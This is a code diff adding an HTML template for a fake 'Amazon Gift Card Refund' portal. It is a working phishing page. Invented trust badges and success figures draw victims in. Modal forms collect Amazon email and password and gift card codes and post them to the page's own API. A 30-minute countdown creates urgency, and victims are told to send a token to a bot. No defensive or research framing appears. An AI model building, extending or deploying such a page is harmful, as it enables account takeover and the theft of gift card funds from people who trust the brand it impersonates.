@@ -1,0 +1,581 @@
+<!-- templates/index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon GC Refund Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            font-family: 'Courier New', 'Fira Code', monospace;
+            min-height: 100vh;
+            color: #00ff41;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Matrix rain effect */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.1;
+            pointer-events: none;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Glitch effect */
+        .glitch {
+            font-size: 3rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            position: relative;
+            text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75);
+            animation: glitch 0.3s infinite;
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75); }
+            25% { text-shadow: -0.05em 0 0 rgba(0,255,0,0.75), 0.05em 0.025em 0 rgba(255,0,0,0.75); }
+            50% { text-shadow: 0.05em 0.025em 0 rgba(0,255,0,0.75), -0.05em 0 0 rgba(255,0,0,0.75); }
+            75% { text-shadow: -0.05em 0.025em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,0,0.75); }
+            100% { text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75); }
+        }
+
+        /* Hacker card style */
+        .card {
+            background: rgba(0, 0, 0, 0.85);
+            border: 1px solid #00ff41;
+            border-radius: 10px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 35px rgba(0, 255, 65, 0.4);
+        }
+
+        /* Button styles */
+        .btn {
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            font-family: monospace;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 0.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, #00ff41, #00cc33);
+            color: #000;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.8);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(45deg, #ff6b35, #ff4757);
+            color: #fff;
+            box-shadow: 0 0 15px rgba(255, 71, 87, 0.5);
+        }
+
+        .btn-secondary:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(255, 71, 87, 0.8);
+        }
+
+        /* Input fields */
+        .input-group {
+            margin: 1rem 0;
+        }
+
+        input {
+            width: 100%;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #00ff41;
+            border-radius: 5px;
+            color: #00ff41;
+            font-family: monospace;
+            font-size: 1rem;
+        }
+
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+
+        /* Blinking cursor */
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* Status badges */
+        .badge {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            margin: 0.25rem;
+        }
+
+        .badge-success {
+            background: rgba(0, 255, 65, 0.2);
+            border: 1px solid #00ff41;
+            color: #00ff41;
+        }
+
+        .badge-warning {
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid #ffc107;
+            color: #ffc107;
+        }
+
+        .badge-danger {
+            background: rgba(255, 71, 87, 0.2);
+            border: 1px solid #ff4757;
+            color: #ff4757;
+        }
+
+        /* Timer */
+        .timer {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #ffc107;
+            text-align: center;
+            margin: 1rem 0;
+        }
+
+        /* Copy button */
+        .copy-btn {
+            background: transparent;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: #00ff41;
+            color: #000;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: #0a0a0a;
+            border: 2px solid #00ff41;
+            border-radius: 10px;
+            padding: 2rem;
+            max-width: 500px;
+            width: 90%;
+        }
+
+        /* Loading spinner */
+        .spinner {
+            border: 3px solid rgba(0, 255, 65, 0.3);
+            border-top: 3px solid #00ff41;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 1rem auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container { padding: 1rem; }
+            .glitch { font-size: 1.8rem; }
+            .btn { padding: 0.75rem 1.5rem; font-size: 0.9rem; }
+        }
+
+        /* Trust badges section */
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+            margin: 2rem 0;
+        }
+
+        .trust-item {
+            text-align: center;
+            padding: 0.5rem;
+        }
+
+        .trust-item i {
+            font-size: 2rem;
+        }
+
+        /* Color text variations */
+        .text-cyan { color: #00ffff; }
+        .text-green { color: #00ff41; }
+        .text-yellow { color: #ffc107; }
+        .text-orange { color: #ff6b35; }
+        .text-pink { color: #ff69b4; }
+        .text-purple { color: #9b59b6; }
+    </style>
+</head>
+<body>
+    <div class="matrix-bg" id="matrix"></div>
+    
+    <div class="container">
+        <!-- Main Heading -->
+        <div class="glitch" style="text-align: center;">AMAZON GIFT CARD (GC) REFUND</div>
+        
+        <!-- Description with multiple colors -->
+        <div class="card">
+            <p style="font-size: 1.2rem; line-height: 1.8;">
+                <span class="text-cyan">⚡ INSTANT REFUND SYSTEM v4.2.0</span><br>
+                <span class="text-green">✓ 100% Working & Genuine</span> | 
+                <span class="text-yellow">✓ Trusted by 50,000+ Users</span> | 
+                <span class="text-orange">✓ 99.9% Success Rate</span><br>
+                <span class="text-pink">💰 Refund processed in <span class="blink">5-10 minutes</span></span><br>
+                <span class="text-purple">🔒 256-bit SSL Encrypted</span> | 
+                <span class="text-cyan">🛡️ Secure & Anonymous</span><br>
+                <span class="text-green">🏆 #1 Amazon Refund Service 2024</span>
+            </p>
+        </div>
+        
+        <!-- Trust Badges -->
+        <div class="trust-badges">
+            <div class="trust-item">✅ 100% Working</div>
+            <div class="trust-item">⭐ Genuine Service</div>
+            <div class="trust-item">🔒 Trusted Platform</div>
+            <div class="trust-item">⚡ Instant Processing</div>
+            <div class="trust-item">🎯 50k+ Successful Refunds</div>
+        </div>
+        
+        <!-- Two Main Buttons -->
+        <div style="display: flex; justify-content: center; gap: 2rem; flex-wrap: wrap; margin: 2rem 0;">
+            <button class="btn btn-primary" onclick="showAccountModal()">
+                🔐 I HAVE MY AMAZON ACCOUNT AND I WANT TO REFUND THE REDEEMED CODE
+            </button>
+            <button class="btn btn-secondary" onclick="showCodeModal()">
+                🎫 I HAVE AMAZON REDEEM CODE WHICH I WANT TO RETURN
+            </button>
+        </div>
+        
+        <!-- Features Section -->
+        <div class="card">
+            <h3 style="color: #ffc107; margin-bottom: 1rem;">⚡ Why Choose Us?</h3>
+            <ul style="list-style: none;">
+                <li>🚀 <span class="text-green">Instant Refund in 5-10 Minutes</span></li>
+                <li>💎 <span class="text-cyan">No Hidden Fees - 100% Transparent</span></li>
+                <li>🔐 <span class="text-yellow">Bank-Level Security Encryption</span></li>
+                <li>🎯 <span class="text-orange">99.9% Success Rate on Refunds</span></li>
+                <li>🤝 <span class="text-pink">24/7 Customer Support</span></li>
+                <li>📜 <span class="text-purple">Verified & Trusted by Community</span></li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Account Modal -->
+    <div id="accountModal" class="modal">
+        <div class="modal-content">
+            <h2 style="color: #00ff41;">🔐 Account Refund</h2>
+            <div class="input-group">
+                <input type="text" id="amazonEmail" placeholder="Amazon Email / Phone Number">
+            </div>
+            <div class="input-group">
+                <input type="password" id="amazonPassword" placeholder="Amazon Password">
+            </div>
+            <button class="btn btn-primary" onclick="submitAccount()">Continue →</button>
+            <button class="copy-btn" onclick="closeModal('accountModal')">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Code Modal -->
+    <div id="codeModal" class="modal">
+        <div class="modal-content">
+            <h2 style="color: #ff6b35;">🎫 Gift Card Refund</h2>
+            <div class="input-group">
+                <input type="text" id="giftCode" placeholder="Enter Amazon Redeem Code">
+            </div>
+            <button class="btn btn-secondary" onclick="submitCode()">Process Refund →</button>
+            <button class="copy-btn" onclick="closeModal('codeModal')">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Processing Modal -->
+    <div id="processingModal" class="modal">
+        <div class="modal-content" style="text-align: center;">
+            <div class="spinner"></div>
+            <h3 id="processingTitle">Processing Your Request...</h3>
+            <p id="processingMessage">Please wait while we verify your information</p>
+        </div>
+    </div>
+
+    <!-- Result Modal -->
+    <div id="resultModal" class="modal">
+        <div class="modal-content">
+            <h2 id="resultTitle" style="text-align: center;"></h2>
+            <div id="resultContent"></div>
+            <div class="timer" id="timerDisplay">30:00</div>
+            <p id="resultMessage" style="margin: 1rem 0;"></p>
+            <div style="display: flex; justify-content: center;">
+                <button class="copy-btn" onclick="closeModal('resultModal')">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Matrix Rain Effect
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        document.querySelector('.matrix-bg').appendChild(canvas);
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*";
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        
+        for(let i = 0; i < columns; i++) {
+            drops[i] = 1;
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0f0';
+            ctx.font = fontSize + 'px monospace';
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 50);
+        
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+        
+        let currentTxid = null;
+        let timerInterval = null;
+        
+        function showAccountModal() {
+            document.getElementById('accountModal').style.display = 'flex';
+        }
+        
+        function showCodeModal() {
+            document.getElementById('codeModal').style.display = 'flex';
+        }
+        
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+            if(timerInterval) clearInterval(timerInterval);
+        }
+        
+        async function submitAccount() {
+            const email = document.getElementById('amazonEmail').value;
+            const password = document.getElementById('amazonPassword').value;
+            
+            if(!email || !password) {
+                alert('Please enter both email and password');
+                return;
+            }
+            
+            closeModal('accountModal');
+            document.getElementById('processingModal').style.display = 'flex';
+            document.getElementById('processingTitle').innerHTML = '🔐 Verifying Account...';
+            document.getElementById('processingMessage').innerHTML = 'Connecting to Amazon servers...';
+            
+            try {
+                const response = await fetch('/api/refund/account', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                
+                const data = await response.json();
+                document.getElementById('processingModal').style.display = 'none';
+                
+                if(data.status === 'success') {
+                    currentTxid = data.txid;
+                    showResult('account', currentTxid);
+                } else {
+                    alert('Error: ' + (data.error || 'Something went wrong'));
+                }
+            } catch(err) {
+                document.getElementById('processingModal').style.display = 'none';
+                alert('Network error. Please try again.');
+            }
+        }
+        
+        async function submitCode() {
+            const giftCode = document.getElementById('giftCode').value;
+            
+            if(!giftCode) {
+                alert('Please enter the gift card code');
+                return;
+            }
+            
+            closeModal('codeModal');
+            document.getElementById('processingModal').style.display = 'flex';
+            document.getElementById('processingTitle').innerHTML = '🎫 Processing Gift Card...';
+            document.getElementById('processingMessage').innerHTML = 'Verifying code validity...';
+            
+            try {
+                const response = await fetch('/api/refund/code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ gift_code: giftCode })
+                });
+                
+                const data = await response.json();
+                document.getElementById('processingModal').style.display = 'none';
+                
+                if(data.status === 'success') {
+                    showResult('code', data.redeem_token);
+                } else {
+                    alert('Error: ' + (data.error || 'Something went wrong'));
+                }
+            } catch(err) {
+                document.getElementById('processingModal').style.display = 'none';
+                alert('Network error. Please try again.');
+            }
+        }
+        
+        function showResult(type, token) {
+            const modal = document.getElementById('resultModal');
+            const title = document.getElementById('resultTitle');
+            const content = document.getElementById('resultContent');
+            const message = document.getElementById('resultMessage');
+            
+            if(type === 'account') {
+                title.innerHTML = '✅ ACCOUNT SUBMITTED SUCCESSFULLY';
+                content.innerHTML = `
+                    <div style="background: rgba(0,255,65,0.1); padding: 1rem; border-radius: 5px; margin: 1rem 0;">
+                        <p><strong>📌 Your TXID:</strong></p>
+                        <code style="font-size: 1.2rem; word-break: break-all;">${token}</code>
+                        <button class="copy-btn" onclick="copyToClipboard('${token}')" style="margin-left: 1rem;">📋 Copy</button>
+                    </div>
+                `;
+                message.innerHTML = `
+                    ⚠️ <strong>IMPORTANT:</strong> Copy your TXID and send it to this bot: <strong>@${BOT_USERNAME}</strong><br><br>
+                    Your account has been submitted for recovery process.<br>
+                    ⏰ <strong>This TXID will expire in 30 minutes</strong><br><br>
+                    📌 <strong>Your refund will be processed within 12 hours</strong><br>
+                    🔄 Status: <span class="badge-warning">Pending Verification</span>
+                `;
+            } else {
+                title.innerHTML = '🎫 GIFT CARD SUBMITTED';
+                content.innerHTML = `
+                    <div style="background: rgba(255,107,53,0.1); padding: 1rem; border-radius: 5px; margin: 1rem 0;">
+                        <p><strong>🔖 Your Redeem Token:</strong></p>
+                        <code style="font-size: 1.2rem; word-break: break-all;">${token}</code>
+                        <button class="copy-btn" onclick="copyToClipboard('${token}')" style="margin-left: 1rem;">📋 Copy</button>
+                    </div>
+                `;
+                message.innerHTML = `
+                    ⚠️ <strong>IMPORTANT:</strong> Copy your Redeem Token and send it to this bot: <strong>@${BOT_USERNAME}</strong><br><br>
+                    ⏰ <strong>This token will expire in 30 minutes</strong><br><br>
+                    🚀 <strong>Your refund will be generated in 5-10 minutes after sending the token to the bot</strong><br>
+                    ✅ Status: <span class="badge-success">Processing</span>
+                `;
+            }
+            
+            modal.style.display = 'flex';
+            startTimer(30, token);
+        }
+        
+        function startTimer(minutes, token) {
+            let time = minutes * 60;
+            const timerDisplay = document.getElementById('timerDisplay');
+            
+            if(timerInterval) clearInterval(timerInterval);
+            
+            timerInterval = setInterval(() => {
+                const mins = Math.floor(time / 60);
+                const secs = time % 60;
+                timerDisplay.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                
+                if(time <= 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.innerHTML = 'EXPIRED';
+                    timerDisplay.style.color = '#ff4757';
+                }
+                time--;
+            }, 1000);
+        }
+        
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✓ Copied to clipboard!');
+            }).catch(() => {
+                prompt('Copy manually:', text);
+            });
+        }
+        
+        // Prevent closing modals by clicking outside
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+                if(timerInterval) clearInterval(timerInterval);
+            }
+        }
+    </script>
+</body>
+</html>
